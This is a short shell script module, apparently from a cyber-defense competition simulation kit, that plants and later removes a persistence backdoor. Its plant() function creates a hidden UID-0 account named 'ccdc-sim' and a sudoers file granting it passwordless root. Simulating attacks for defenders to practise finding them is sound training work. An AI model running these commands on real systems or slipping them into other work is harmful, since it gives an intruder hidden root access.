# technique: rogue UID-0 user + passwordless sudo (guide 1.1)
name="user-add"
plant() {
    useradd -o -u 0 -g 0 -s /bin/bash -M ccdc-sim 2>/dev/null
    echo 'ccdc-sim ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/ccdc-sim
    chmod 440 /etc/sudoers.d/ccdc-sim
}
clean() {
    userdel -f ccdc-sim 2>/dev/null
    rm -f /etc/sudoers.d/ccdc-sim
}
